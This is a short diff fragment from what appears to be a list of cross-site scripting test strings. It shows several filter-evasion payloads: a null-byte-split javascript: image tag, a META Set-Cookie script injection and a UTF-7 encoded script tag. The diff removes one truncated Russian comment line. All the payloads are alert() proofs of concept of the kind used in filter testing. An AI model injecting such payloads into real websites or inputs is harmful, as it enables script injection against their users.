@@ -79,4 +79,3 @@ perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 echo('IPT>alert("XSS")</SCRIPT>'); ?>
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
-Привет. И все вот эти строчки тестиро
